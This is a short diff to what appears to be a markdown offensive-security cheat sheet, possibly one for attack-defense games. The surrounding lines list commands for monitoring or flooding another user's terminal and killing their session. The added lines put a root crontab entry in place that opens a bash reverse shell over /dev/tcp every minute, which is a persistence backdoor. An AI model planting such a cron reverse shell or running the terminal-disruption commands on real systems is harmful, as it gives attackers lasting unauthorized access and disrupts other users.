@@ -306,7 +306,10 @@ If there is a port 53 open on the machine you could do a zone transfer to get in
 * script /dev/pts/pts-number `montior terminal`
 * cat /dev/urandom > /dev/pts/pts-number  2>/dev/null `prints arbitary text on terminal`
 * pkill -9 -t pts/pts-number
-
+* Add this in root's crontab (crontab -e) <br />
+```
+*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
+```
 ### Change SSH port
 `nano /etc/ssh/sshd_config` (change PORT 22 to any port you want also you can tinker with configuration file)
 `service sshd restart`     (Restart SSH service to apply changes)
